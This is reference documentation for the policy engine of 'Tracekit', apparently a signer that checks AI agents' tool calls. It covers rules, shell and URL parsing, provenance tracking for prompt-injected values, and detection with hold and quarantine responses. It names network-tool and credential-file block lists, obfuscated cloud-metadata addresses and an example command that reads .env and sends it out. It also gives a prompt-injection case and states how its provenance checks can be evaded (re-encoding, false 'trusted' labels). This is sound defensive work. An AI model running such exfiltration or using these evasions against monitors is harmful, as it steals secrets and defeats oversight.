# Policy reference (v2 signer)

The v2 signer decides every tool call itself, over the raw arguments, with its own policy (`tracekit/policy2/`). The
agent can't change the policy or the tool's class: a class the adapter declares is a hint, and the class the policy
maps the tool to wins. The v1 daemon's regex engine is a different one ([README](../README.md#policy-and-approvals)).

```sh
tracekit policy lint my-policy.yaml       # every error at once
tracekit policy compile my-policy.yaml    # canonical JSON and its policy_hash
```

The signer loads `policy:` from `signer.yaml` (YAML or JSON), or `tracekit/policy2/packs/dev.yaml` by default, and
refuses to start on a lint error. `dev.yaml` is the laptop pack: the server deployments set `policy:` to the server
pack. The image links the installed packs at `/etc/tracekit/packs`; its example config runs
`/etc/tracekit/packs/server.yaml`, and the Helm charts and the compose stack mount a `/etc/tracekit/policy.yaml` that
says `extends: packs/server.yaml` (Helm value `signer.policy`; compose's `policy.yaml`). Replace that file with your
own policy; `extends` takes relative paths only, so a policy at `/etc/tracekit/policy.yaml` reaches the server pack as
`packs/server.yaml`.
YAML policies are always read by Tracekit's own YAML subset (`tracekit/yamlmini.py`), never PyYAML, so a
policy means the same on every signer: duplicate keys, anchors, aliases and merge keys are errors.

## Decisions

Each matching rule adds its id to the decision; the strictest section wins: **deny > ask > flag > allow**. `flag`
lets the call run and marks it; `ask` holds it for an [approval](approvals.md). The signed `policy.decision` carries
the verdict, every matching rule id, `policy_hash`, `engine` (`re2@<version>` or `regex@<version>`), a fresh
`decision_id` and the `args_commitment`. The `decide` RPC answers `allow` for a flagged call, with the flag rule's id
in `rule_ids`: its `decision` says what the client does (run, refuse or hold the call), and is `allow`, `deny` or
`ask` for every client since RPC version 15. A signer can't tell which version a client speaks, and an older client
would refuse a value it doesn't know, so the flag is in the signed record only.

Rule ids the signer adds itself:

| Id | Verdict | When |
|---|---|---|
| `TK-ARGS-INVALID` | deny | the raw arguments are not strict JSON ([format v2](format-v2.md#1-canonical-json)); the Python client sends parsed arguments a frame can't carry (a lone surrogate) as raw text, so they get this signed deny too |
| `TK-OVERSIZE` | the rule's section | a rule's subject is over 64 KiB of UTF-8; it is never cut or windowed, and the rule's own section decides (a flag rule flags, a deny rule denies; a shell command over 64 KiB denies). The decision's `reasons` (and the `decide` response's `reason`) name each such subject by its rule and field: `TK-S002's subject (the whole arguments)` |
| `TK-SHELL-PARSE` | ask | a shell command can't be parsed, or what it runs can't be read from the line |
| `TK-SQL-PARSE` | ask | no SQL dialect can read the statement (an unclosed literal or comment), or it is not text |
| `TK-UNKNOWN-TOOL` | `unknown_tools` | the tool maps to no class and `unknown_tools` is `flag`, `ask` or `deny` (map an application's own tools to `app`) |

Each `decide` gets a new `decision_id`, consumed once by `complete` with the same arguments; `complete` with other
arguments is refused. Only deny and ask are remembered per `(tool_call_id, attempt)`. An allow after a deny for the
same arguments in a run is a signed `capture.gap{decision_flip}`; a class hint that disagrees with the policy is a
`capture.gap{class_mismatch}` and the stricter of the two decisions applies.

## File format

```yaml
version: '2026.10-v2-1'
description: what this policy is for
extends: coding.yaml            # optional: a relative path, or a list of them; the compiled policy names parents by hash
unknown_tools: ask              # allow (default), flag, ask or deny

                                        # transfer_to_*, LangGraph routing schemas such as CompleteOrEscalate); no
                                        # pack names any: exact names, as your agents' handoff tools are called
structured_output: ['browser_use:*']    # tool names the model asks for in its structured output, not as tool calls:
                                        # reconciliation doesn't compare them with tool uses (browser.yaml names these)
explains:                       # hosts a tool's own dependencies reach, for the egress observer (docs/egress.md#explains)
  - {label: package-install, hosts: [pypi.org, '*.pythonhosted.org']}   # a rule label, or a tool glob: {tool: ...}

ask:   [<rule>, ...]
flag:  [<rule>, ...]

limits:    [<limit>, ...]       # detection: counts and sums in a window
respond:   [<respond>, ...]     # detection: what each trigger does (shadow, or enforced: docs/incidents.md)
```

`extends` merges the parent's `tools` under the child's, joins every `untrusted`, `handoffs`, `structured_output` and
`explains` list (a child can't remove a name its parent declares), keeps the parent's other top-level keys unless the
child sets them, and keeps the parent's rules except those whose id the child redefines. A list of parents is merged in
order (a later parent's top-level keys and tools win; the same rule id in two parents is a duplicate-id error, unless
both carry the identical rule, which is kept once). `sequences`, `limits` and `respond` merge the same way, by id
(`respond` by trigger): a deployment that adds a sequence keeps the pack's. The compiled `extends` is the list of their
hashes. An absolute path, `~` or a loop is an error.

**Rule fields:**

| Field | Required | Meaning |
|---|---|---|
| `id` | yes | unique across the policy |
| `pattern` | yes | RE2-subset regex, searched for in the subject (unanchored unless it uses `^`/`$`) |
| `class` | no | the rule applies only to tools of this class; without it, to every tool |
| `tool` | no | regex that must match the whole tool name |
| `field` | no | which subject to match (below) |
| `unless` | no | regex; a subject that matches it is exempt |
| `reason`, `rationale`, `label` | no | text; `reason` is shown with the decision, `label` names a flag's category (sequences and limits match labels) |
| `from` | no | `untrusted`: the rule also needs a value of its subject that only untrusted content brought into the run (Provenance) |
| `approval` | no | on an `ask` rule only: `executor: t1` (default) or `t2` ([approvals](approvals.md#tiers-t1-and-t2-executors)), and/or `passkey: required` ([approvals](approvals.md#web-approvals-and-passkeys)), and/or `agent` (below) |

Lint also rejects unknown keys, a `field` the rule's class doesn't have, and a class rule no tool maps to ("can never
fire"). It warns (`tracekit policy lint`, which loads the policy all the same) on a tool mapped to `unknown`: that is
what an unmapped tool already is, so `unknown_tools` still decides it. Map an application's own tools to `app`.

### Agent approvers (`approval.agent`)

`approval: {agent: {mode, allow: {fields}, budget?, veto_s?}}` lets an agent approver answer the rule's held calls
within bounds ([approvals](approvals.md#agent-approvers)). It is part of the policy, so of `policy_hash`.

| Key | Meaning |
|---|---|
| `mode` | `enforce`, or `shadow`: answers are recorded as `approval.suggested` and change nothing |
| `allow.fields` | argument name → `{type: integer\|string\|boolean, min?, max?, enum?, pattern?}`; `min`/`max` on integers, `pattern` (RE2 subset, whole value) on strings, `enum` values of the field's type. A closed world: every argument must be named, every named one present |
| `budget` | `{count?, sum?: {field, max}, window, scope: tenant\|requester}`: at most `count` agent approvals, and `sum` of an integer field with `min` >= 0, in `window` seconds (at most 30 days) |
| `veto_s` | an agent's approval runs only after this many seconds, so people may revoke it first |

Lint errors: `approval.agent` with `passkey: required`, or on a `from: untrusted` rule (people answer those). A warning
(`tracekit policy lint`): `approval.agent` on a `payment` rule without `executor: t2`, where the approval binds the
arguments the agent reported rather than what runs. The signer refuses to start with a policy that has agent rules
and no `approvals.agents`.

`policy_hash` is `sha256:` of the compiled policy as sorted-key, compact JSON (`policy2.compile.canonical`).

## Classes and fields

An MCP tool (`mcp:<server>/<tool>`) is also checked under its bare name `<tool>`, in that name's own class if `tools:`
maps it, else the MCP call's; the stricter decision applies, with both readings' rule ids. A rule on an app tool's name
holds when the same call is labelled an MCP one.

The signer maps the tool to a class (`tools`: exact name first, then the most specific matching glob, the one with
the most characters other than `*` and `?`, so `mcp:postgres/*` wins over `mcp:*/*`; else `unknown`) and extracts the
class's fields from the raw arguments (`policy2/classes.py`):

| Class | Fields | Taken from |
|---|---|---|
| `shell` | `command`, `argv`, `line` | `command`, `cmd` or `commands` (one of them: a string, or a list of strings) |
| `fs` | `path`, `op`, `content_digest` | `file_path`, `notebook_path`, `path`; op from the tool (Write, Edit, Read…) or `op` |
| `http` | `method`, `url`, `host`, `internal`, `sends_to` | `url`, `method` (default GET); `host` and `internal` as below; `sends_to`: the host, when the method is not GET or HEAD or there is a `body`, `data`, `json`, `files`, `form` or `content` |
| `sql` | `statement`, `code`, `verb`, `db` | `sql`, `query` or `statement`; `db` or `database`; `code` as below, `verb` its first word |
| `payment` | `amount`, `currency`, `payee`, `new_payee`, `payees` | `amount`/`amount_cents`, `currency`, `payee`/`to`/`recipient` (`new_payee` is not extracted yet); `payees`: every one of `payee`, `to`, `recipient`, `destination`, `account`, `account_number`, `iban` |
| `email` | `to`, `domains`, `attachments`, `recipients` | `to` (string or list), `attachments`; `recipients`: every one of `to`, `cc`, `bcc`, `recipients` |
| `mcp` | `server`, `tool`, `args` | the tool name (`mcp__server__tool` or `mcp:server/tool`) and the arguments |
| `browser` | `action`, `url`, `scheme`, `host`, `internal`, `sends_to` | `action`, `url`; `scheme`, `host` and `internal` as below; `sends_to`: the host of `page_url` for `input` and `upload_file`, and the URL's host for a `navigate` or `go_to_url` whose URL has a query string |
| `app` | — | — (an application's own tool: known, so `unknown_tools` doesn't apply; rules reach it by `tool` name, `field: target` or a raw argument `field`) |
| `unknown` | — | — |

Every class also has `target`: what the call acts on rather than what it carries (below).

- `host`: the URL's host as a browser reads it (`host:port/path` without a scheme is http; controls, tabs and newlines dropped, `view-source:` and `blob:`
  peeled, `\` as `/`, any number of slashes after the scheme, the host after the last `@`), percent-decoded, NFKC
  (fullwidth letters and digits), casefolded, without port or trailing path; an IP address in its canonical form
  (`169.16689662`, `0xa9.0xfe.0xa9.0xfe` and `[::ffff:a9fe:a9fe]` are all `169.254.169.254`).
- `internal`: `true` when the host is a loopback, private, link-local, shared (CGNAT), reserved, multicast or
  unspecified address in any notation (also the IPv4 address inside a mapped, compatible, 6to4 or NAT64 IPv6 address),
  looks like an address but is none (`1.2.3.4.5`), or when a browser and Python's urllib read different hosts from the
  URL (`http://a\@b/`); else `false`.
- `scheme`: the URL's scheme as a browser reads it (`view-source:file:` and `fi<TAB>le:` are `file`).
- `code`: the statement with comments blanked and every literal and quoted identifier (`'…'`, `E'…'`,
  `$tag$…$tag$`, `"…"`, `` `…` ``, `[…]`) replaced by `''` or `""`, once for each way PostgreSQL, MySQL, SQLite and
  SQL Server split it (backslash escapes, `#` comments, nested `/* */` and `--` differ), so a keyword hidden in one
  dialect's comment or literal but run by another is still seen. A dialect that can't read it (an unclosed literal)
  is left out.

## What a rule matches (the subject)

| Rule | Subject |
|---|---|
| `class: shell`, no `field` or `field: argv` | each simple command the line runs, as its argv joined by spaces, argv[0] a basename |
| `class: shell`, `field: command` | the raw command line |
| `class: shell`, `field: line` | the raw command line and each line the parser normalised (quotes and escapes resolved, redirections kept) |
| `class: fs`, `field: path` | the normalised path, and with a `..` also the lexically normalised one; each also casefolded |
| `class: sql`, `field: code` | each dialect's reading of the statement (`code` above) |
| `field: target` (any class, or no class) | shell: each command's argv without its data words (a `git commit`/`tag`/`merge` message, the pattern `grep`, `rg` or `git grep` searches for), its redirection targets and `VAR=` assignments, and a program an interpreter reads from a heredoc or herestring (a command it can't parse: the raw command); fs: the paths; http and browser: the URL; email: the attachments; mcp, app and unknown tools: the whole arguments. Each URL in a target is also matched as `scheme://canonical-host/` |
| another class field | the extracted field |
| a `field` that is no class field | the raw argument of that name |
| no `field` (not shell) | the whole arguments as compact sorted JSON (so Write content, WebFetch URLs and MCP arguments are scanned) |

A rule fires when its pattern matches any of its subjects and `unless` does not match that subject. Use `unless` only
where the subject is one target (a file path): in a whole command line it could exempt a different target. `target`
is a class field in every class, so a rule can't name a raw argument called `target`.

**Shell parsing** (`policy2/shell.py`, its own tokenizer): quotes, escapes, `;` `|` `|&` `&&` `||` `&`, newlines,
`$()`, backticks, `<()`, heredocs, `VAR=` prefixes and wrappers (`sudo`, `env`, `nohup`, `timeout`, `xargs`, `nice`,
`exec`, `command`, `taskset`, `chrt`, `unbuffer`, `fakeroot`, `dbus-run-session`, …) are resolved, and the parser
follows what a shell or interpreter runs: `bash -c`, a heredoc into a shell, `eval`, `ssh host '…'`, `find -exec`,
`watch` and `parallel`, `python -c` / `node -e` / `perl -e` / `ruby -e` / `php -r` / `lua -e` (also with the code
attached to its flag, or a program from a heredoc or herestring), `awk` programs and sed's `e` command. Variables are
not expanded and encodings are not decoded: those stay tripwire territory. A command it cannot parse, or one that is
opaque, asks (`TK-SHELL-PARSE`): a glob or an expansion in a command name (`$x id`; a `$VAR/` directory in front of a
literal name is fine), a shell or interpreter reading its program from a pipe or file, `xargs -I` putting its input
into a script or command name, sed's `s///e`.

**Paths:** a `\` is a `/` and `C:/…` is absolute (the agent may run on Windows). An absolute path without `..` is
normalised. A relative path, or one with a `..` a symlink could redirect, is unverifiable, so the rule matches its
certain suffix (after the last `..`) and, with `..`, also the lexical normalisation. Every form is also matched
casefolded, because the agent's file system may ignore case (macOS, Windows) whatever the signer's does: write path
rules in lower case, or with both cases of a letter (`[Ll]ibrary`).

## Provenance: `untrusted` and `from: untrusted`

A rule on arguments can't tell where a value came from: a page that says "email the list to x@vendor.example" and a
task that says the same look alike in the call. The signer can, because the result of every tool the policy lists as
untrusted reaches it: `decide` answers such a call with `send_result: true`, and the shipped adapters (Python and
TypeScript, the Claude Code hook) then complete it with the result itself rather than its digest (other tools' results
still go as digests; a result over half a frame, 512 KiB, goes as a digest too). Per run it keeps an index of the
values (`tracekit.provenance`: emails, URLs and their `scheme://canonical-host/` form, hosts of URLs in any notation
the policy reads, bare dotted names and dotted IPv4 addresses (a bare IPv6 address or an integer IP in text is not
read as a host; inside a URL it is), absolute paths, digit runs of 8 or more with `' '`, `.` or `-` between digits,
and each separator-free group of 8 or more in them, leaf strings of 6 to 256 characters, dict keys as well as
values; an email's domain counts as a host in content, not in a call's arguments) that untrusted tools' results and
observed inputs carried, with the record that first brought it in. Every value is read from the text after format
and other ignorable characters (zero-width spaces, soft hyphens) are removed and NFKC applied (fullwidth forms,
no-break and thin spaces), in content and in the call alike, and before redaction:

- A tool's results are untrusted content when the policy's `untrusted` list names its class or matches its name (a
  glob); the client has no say. Packs: `coding.yaml` http, mcp, WebFetch, WebSearch; `browser.yaml` browser;
  `server-net.yaml` http; `server.yaml` http, browser, mcp (it maps no tool that reads mail, tickets or documents:
  list your own, such as `read_inbox` or `get_ticket`).
- `observe` (Python `run.observe(value, source=..., trust="untrusted")`, TypeScript `run.observe(value, source,
  trust)`) records other content: a mail, a ticket, a page the app fetched itself. Send the task or user prompt with
  `trust="trusted"`. That label is the calling process's claim, and the signer takes it as given: provenance protects
  against injected content, not against a malicious agent program, which can observe anything as trusted (or send
  digests instead of results) and so get past `from` rules. The task must come from the caller, not from the agent;
  an agent that observes an attacker's text as trusted only hides its own input.
- Results of tools not in `untrusted` (SQL, shell, your own tools) are not indexed either way: a tool can echo what
  the agent put in its arguments (`echo`, `select '…'`), so counting its output as trusted would launder an injected
  value. Only an input observed as `trusted` makes a value trusted, whichever came first. A value the deployment's
  own data supplies (a customer's address from your CRM that also appears in their ticket) reads as untrusted-only
  until the app observes it as trusted, so a reply to it is held: observe the record you looked up, or answer the
  hold.

A rule with `from: untrusted` matches only when its pattern matches as usual **and** a value in that subject is
untrusted-only in the run. A list field (`payees`, `recipients`) is checked element by element; `sends_to` is looked
up as the host it is. A decision records `provenance` (up to 16 arguments whose values are untrusted-only, as
`{field, kind, source: {run_seq, tool, tool_call_id}}` — never the value) when there is something to show, and
`provenance_state` with `provenance_reason` when the index is not `complete`
([format](format-v2.md#3-events)):

| State | When |
|---|---|
| `partial` | an untrusted tool's call completed with a digest, a `{hash, size}` reference or no result (an adapter that ignores `send_result`), or a client's events skipped a `client_seq` (`client_counter_gap`: an observe or a result the signer never got), from the decision that reveals the gap on |
| `truncated` | a result or untrusted observed input carried more values than are read (4096 values, 1 MiB of text), or the run's index reached 20000 values |
| `unavailable` | the signer restarted: the index lives in memory only (a storage outage the signer recovers from keeps it) |
| `timeout` | reading this call's values took past the decision's deadline (1 s) |

**Fail closed:** in every state but `complete` a `from: untrusted` rule matches whenever its pattern does, in its own
section (the packs' `TK-P` rules ask), since the index can no longer say a value is not untrusted. The first cause
stays for the rest of the run (`timeout` only for that decision). The work is bounded: reading values is linear in
the text (1 MiB in well under a second), and a decision reads them only while its index has entries.

| Pack | Section | Rules |
|---|---|---|
| `server-comms.yaml` | ask | `TK-P001` an email recipient (`to`, `cc`, `bcc`, `recipients`) that is untrusted-only · `TK-P002` a payee or account (`payee`, `to`, `recipient`, `destination`, `account`, `account_number`, `iban`) that is untrusted-only |
| `server-net.yaml`, `browser.yaml` | ask | `TK-P003` data sent (a method other than GET or HEAD, or a body; in a browser, typing, an upload or a navigation with a query string) to a host that is untrusted-only |

Limits ([all of Tracekit's](limits.md)): it matches values verbatim, and only what came in through untrusted tools and observed inputs: a page the
agent fetches with a tool the policy doesn't list as untrusted (`curl` in a shell) is not indexed, so list such tools
or observe the content. A value the model paraphrases, splits or re-encodes (spelled out, base64, a URL
shortener) reads as a new value and gets past it. `trust: "trusted"` is the calling process's claim: provenance
protects against injected content, not against a malicious agent program. It is a tripwire on the commonest way
injected instructions act; to prevent the flow, use information-flow control (CaMeL, FIDES) in the agent.

## Detection: sequences, limits and respond

A rule decides each call on its own. Detection looks across calls: a secret read and then a URL, a runaway loop, a
burst of deletes, repeated denied attempts. It runs in the signer (`tracekit/signer/detect.py`), is part of the policy
(so it is in `policy_hash`), and is a pure function of signed records: a verifier or `tracekit policy backtest` gets
the same answer from the same records. No regex runs for it: it reads the rule ids each decision already carries.

```yaml
sequences:
  - id: TK-Q001
    steps: [secrets_access, egress]   # rule ids or labels, in order
    scope: session                    # run (default), session, owner or principal
    window: 600                       # seconds from the first step
    unless: [allowlisted]             # optional: a call that also carries one of these is not a step
limits:
  - id: TK-L002
    match: destructive                # a rule id, a label, or * (every call)
    count: true                       # or sum: {field: cents, currency_field: currency}
    max: 30                           # an incident when a window goes past it
    window: 60
    scope: session
respond:
  - {trigger: TK-L002, mode: shadow, action: hold}   # mode off|shadow|enforce, action notify|hold|quarantine
  - {trigger: denied_calls, mode: shadow, action: notify, max: 5, window: 300, scope: run}
  - {trigger: executed_against_policy, mode: enforce, action: quarantine, cooldown_s: 3600}
```

**What counts.** A call's names are its rule ids from both class readings (the policy's and the client's hint, so a
mismatch can't hide a step), each rule's `label`, and `*`. A call counts when it was decided `allow` or `flag`, or, for
`ask`, once the approval of that decision is consumed; never when it was asked and not consumed, or denied, and never
later: a step counts when it is decided, whether or not the call then runs. A call that runs against its decision is
`executed_against_policy` (below), not a step. A call whose class is unknown (a tool the policy doesn't map, such as
an alias) matches every step and limit: fail closed.

One call advances each partial sequence by one step, or, when its own names match consecutive steps, through all of
them, each name once: a command that reads a secret and sends it (`curl "https://host/?k=$(cat .env)"`) completes
`[secrets_access, egress]` on its own, while `[egress, egress]` still needs two calls. A step reached through `*` or
an unknown class never takes a call further, so no single unmapped call completes a sequence.

A sum limit reads the `field` (an integer of minor units, cents, at least 0) and the `currency_field` (a three-letter
code, case and surrounding spaces aside) of the call's arguments and keeps one total per currency. A call of a known
class it counts without both is held (`ask`, rule `TK-LIMIT-SUM`: send the amount as a non-negative integer in minor
units with its currency code), unless the limit's `respond` mode is `off`; an unknown-class call is counted when its
amount can be read and is never held for it. Lint rejects unknown names, a name only deny rules carry (it can never
count), windows outside 1..86400 s, more than 64 steps or more than 1024 sequences and limits together, a limit keyed
by a raw tool name (name a rule or label: an alias can't dodge those), a sum limit matching `*`, and sequences or
limits while `unknown_tools` is `allow`.

**Labels.** The packs label their flag rules. `secrets_access` (`TK-F005`) is any call that acts on a secrets file's
name (`.env`, `id_rsa`, `.ssh/`, `credentials`, `.aws/`, `.netrc`): a command's argv or redirection, a file path, an
MCP tool's arguments or a URL, of any tool, writes included; a target that is one env template path (`.env.example`,
`.sample`, `.template`, `.dist`) is not. `egress` is any URL a call acts on (`TK-F012`: an http or browser URL, a URL
in a command, an MCP tool's arguments; GETs with a query string included, not only `sends_to`) and any network command
whatever it names (`TK-F013`: curl, wget, ssh, scp, rsync, nc, ncat, telnet, ftp, dig, nslookup, host). Mail,
payments, SQL and MCP tools without a URL in their arguments are not egress: label your own tools that send data out
(`label: egress` on a flag rule) to bring them in.

**Scope.** `run` is one run; `session` is the root of the run's `parent_run` chain (a run registered without a parent
is its own session, so a split across runs is caught only when the second names the first as parent); `owner` is the
identity that registered the run; `principal` is the run's attested principal (an unattested one counts as `owner`).

**Windows** are fixed: one starts at the first call counted and lasts `window` seconds of the records' `ts`, the
signer's clock. A burst that straddles two windows can reach up to twice `max` before a limit fires. A scope with no
record for an hour (or the longest window, if longer) starts over, open incidents included.

**Decisions** under a policy with sequences or limits carry what detection saw:
`detect: {sequences: [{id, step}], limits: [{id, count, window_start}], state}` (with `rule_ids` when the two class
readings differ, and `sums` for sum limits). `state` is `complete`, or `unavailable` when the detector can't vouch for
what came before: after a restart from a snapshot written without detection or under another policy (until the
longest window has passed), after replaying decisions made under another policy (until the longest window after the
last of them), and for a run it never saw registered. Runs open across such a restart keep their session, owner and
principal.

**Triggers and incidents.** A sequence completing and a limit going past `max` open an incident (`mode: off` in
`respond` silences one). These triggers fire only with a `respond` entry: `executed_against_policy` (a call ran after a
deny or an unapproved ask), `denied_calls` (more than `max` distinct denied calls, per tool call and attempt, in
`window`, at most 1000; nondeterministic denies, and denies that only `TK-ARGS-INVALID` or `TK-OVERSIZE` caused,
don't count), `provenance` (a `from: untrusted` rule held a call whose decision names its provenance and whose index is
complete), and the notify-only `class_mismatch`, `refusal_burst` (a `refusal.summary` over `max`) and `tamper`, which
are never enforced (lint refuses `mode: enforce` or an action other than `notify` on them). Only `denied_calls` takes
`max`, `window` and `scope`, and `refusal_burst` `max`; lint refuses them elsewhere. `unexplained_effect` (a host an
[egress observer](egress.md) saw a run reach that nothing explains) fires once per host and run; the server pack
notifies on it in shadow mode until a deployment's `explains` is tuned.

An incident is a signed `incident.opened {incident_id, trigger, rule_ids, scope, cites, mode, actions, would}` in the
run whose record fired it, citing the records that make it up. One stays open per scope, trigger and rule: later
matches are an `incident.updated {incident_id, cites}` at most once per window of its trigger (a minute for a trigger
without one), written in the run whose record matched, which for a `session`, `owner` or `principal` scope can be
another run than the one that opened it. Only opened incidents count toward the caps: 100 per run and trigger, 60 per
tenant a minute, of which one run may open 20; past a cap one `incident.capped {cap, max, trigger, reason}` is written
instead. An incident carries its trigger's `respond` mode. In **shadow** it has no `actions` and `would` names the
configured action. In **enforce** the signer acts in the same writer step as the record that fired it and lists what it
did in `actions`:

| `action` | What the signer does ([incidents](incidents.md)) |
|---|---|
| `notify` | Nothing more than delivering the incident to every webhook subscribed to `incident` events, at least once (the signer refuses to start without one). |
| `hold` | Every live run the incident's scope reaches is held: its live approvals expire, and each further call is an `ask` (rule `TK-HOLD`, with the `incident_id`) that only a person answers: never an agent approver, never the run's owner, principal or requester, whatever `self_approval` says. The call that fired the hold is decided again, held. With no person approver configured, a hold is a quarantine. |
| `quarantine` | Every live run the scope reaches is quarantined, for good: each further call is denied (`TK-QUARANTINE`; past 100 such denies, refused unrecorded), approvals are refused, a gateway forwards no further model request of it, and it closes with reason `quarantine`. |

`cooldown_s` (default 3600, at most 86400): for that long, a new run of the same owner and attested principal (and any
child run of a held one) starts held or quarantined too. No trigger suspends an identity: that is an operator's call
(`tracekit signer incidents suspend`), and lint refuses `suspend:` in `respond`. Operators resolve incidents, hold, quarantine and resume runs, pause the response engine and suspend identities
with `tracekit signer incidents` ([incidents](incidents.md)).

**Backtest.** `tracekit policy backtest --policy P --store DIR` (a signer's `data_dir/store`, read-only, safe while it
runs) or `--bundle B...` runs the policy's detection over recorded runs and prints the incidents it would open. It
reads the rule ids each decision recorded (arguments are not stored), so for decisions made under another policy, rules
and labels the new one adds or changes are not applied; it warns with their count. Backtest changes to sequences,
limits and `respond` this way; measure new rules and labels by running the policy in shadow.

### Choosing thresholds

The server pack's thresholds are judgment, checked against the shipped runs: the golden v2 bundles
(`tests/golden/v2/`, decided under a test policy) and the server demo (`tracekit demo --server`, decided under the dev
pack). Those runs are small (at most 3 decisions and 1 destructive command in any minute) and open no incident;
`TK-L001` (every call) and `TK-L002` (`destructive`, `TK-F003`, the same rule in the dev pack) sit well above them: 300
calls a minute (an agent working makes a few dozen) and 30 destructive commands a minute. `TK-Q001` was not
backtested: none of those runs reads a secret or sends anything, and the golden bundles record a test policy's rule
ids; its ten minutes are a judgment of how long a secret read and its use stay related. Before enforcing anything,
record runs under the pack in shadow, backtest your own store and set `max` above the busiest minute you see.

## Patterns: the RE2 subset

Patterns must mean the same to RE2 (`google-re2`, used when installed) and to the `regex` module in ASCII mode
(the fallback), so a decision does not depend on the engine. `tracekit policy lint` rejects:

- lookaround, backreferences, atomic groups, possessive repeats, `\Z`;
- groups other than `(?:` and `(?P<name>`, so no inline flags or comments;
- nested sets and `[: :]` classes; a letter or digit escape other than `\d \D \w \W \s \S \b \B \A \n \t \r \f \v
  \xHH` (inside a set: `\d \D \w \W \s \n \t \r \f \v \xHH`), and non-ASCII escapes (escaped ASCII punctuation is fine);
- a literal `{` that isn't escaped, a repeat without a lower bound, repeat counts above 1000 (nested counts
  multiplied: `(?:a{10}){101}` is 1010);
- super-linear shapes (nested repeats);
- an `unless` that matches every subject (`x|`, `.*`): its rule could never fire.

`$` means end of text and `\s` excludes `\v`, as in RE2. The fallback engine backtracks, so a large subject can be
slow where RE2 is linear, and so can a short one under a repeat of overlapping alternatives (`secret(.|\s)*key`):
all matches of one decision share 1 s, and when it runs out the decision denies with the rule that was matching,
leaves the remaining rules out and is marked `nondeterministic: true`. RE2 never times out, so on such a subject the
two engines can decide differently; install `google-re2` on the signer.

A deployment extends `server.yaml` (or composes only the packs it needs), maps its own tool names under `tools` (a
business tool no class fits, such as `book_hotel`, to `app`, so it isn't held as unknown), and redefines a rule by id
to change it: TK-N002's egress allowlist and TK-B011's typing allowlist name `example.com` until
it does. Cloud APIs are covered as CLI commands on a shell tool and as MCP tools; other cloud-SDK-shaped tools need a
mapping and rules of their own.

Server rules (ask rules hold the call for a person):

| Pack | Section | Rules |
|---|---|---|
| `server.yaml` | deny | `TK-S001` cloud metadata service (169.254.169.254 in any notation, fd00:ec2::254, metadata.google.internal, the short names metadata and instance-data, ECS and Alibaba) in what any tool acts on (`target`) · `TK-S002` / `TK-S003` a secret (private key, cloud, VCS, chat, payment or model API token, JWT, URL with a password) in any tool's arguments or a shell line · `TK-S004` credential files (cloud, kube, docker, gcloud, azure, service account token, .pgpass, .netrc, .git-credentials, SSH private keys, /proc/*/environ) in what any tool acts on (`target`: a path, a command's arguments and redirections, an attachment, an MCP tool's arguments; not file content or a commit message) · `TK-S006` a command run through another command's options (tar, git config keys in any case and aliases, ssh, scp, zip, rsync, vim) |

SQL keywords match `code`, outside comments, literals and quoted identifiers in every dialect, so
`SELECT 'DROP TABLE x'` is allowed. `eval/e17_policy_corpus.py`
runs `server.yaml` over the deny and benign corpora in `tests/data/policy/` with both engines and reports per-class deny
recall and the benign false-positive rate.

Rules match raw strings: they are tripwires that make attempts visible, not the protection itself. The protection is
the signer's isolation, its storage and the witnesses ([server threat model](threat-model-server.md)).
